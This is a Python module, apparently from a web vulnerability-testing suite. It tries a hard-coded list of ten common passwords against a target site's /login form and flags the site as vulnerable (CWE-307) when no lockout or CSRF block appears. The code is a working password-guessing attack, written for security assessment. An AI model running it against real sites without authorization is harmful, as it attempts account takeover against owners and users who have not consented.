from __future__ import annotations

import requests

from attack_suite.result_schema import AttackResult
from attack_suite.modules.common import post_form

COMMON_PASSWORDS = [
    "123456",
    "password",
    "qwerty",
    "admin123",
    "letmein",
    "welcome",
    "passw0rd",
    "Password123",
    "iloveyou",
    "changeme",
]


def run(target_url: str) -> AttackResult:
    session = requests.Session()
    lockout_detected = False
    success_detected = False
    csrf_blocked = False
    evidence: list[str] = []

    for password in COMMON_PASSWORDS:
        response = post_form(
            session,
            target_url,
            "/login",
            {"username": "testuser", "password": password},
            timeout=5,
            allow_redirects=False,
        )
        evidence.append(f"{password}:{response.status_code}")
        if response.status_code == 429 or "too many requests" in response.text.lower():
            lockout_detected = True
            break
        if response.status_code == 400 and "csrf" in response.text.lower():
            csrf_blocked = True
            break
        if response.status_code in {301, 302} and "/dashboard" in response.headers.get("Location", ""):
            success_detected = True

    vulnerable = not lockout_detected and not csrf_blocked
    if success_detected:
        vulnerable = True

    return AttackResult(
        attack_name="Brute Force",
        target=target_url,
        vulnerable=vulnerable,
        evidence="; ".join(evidence),
        severity="High",
        cwe_id="CWE-307",
    )
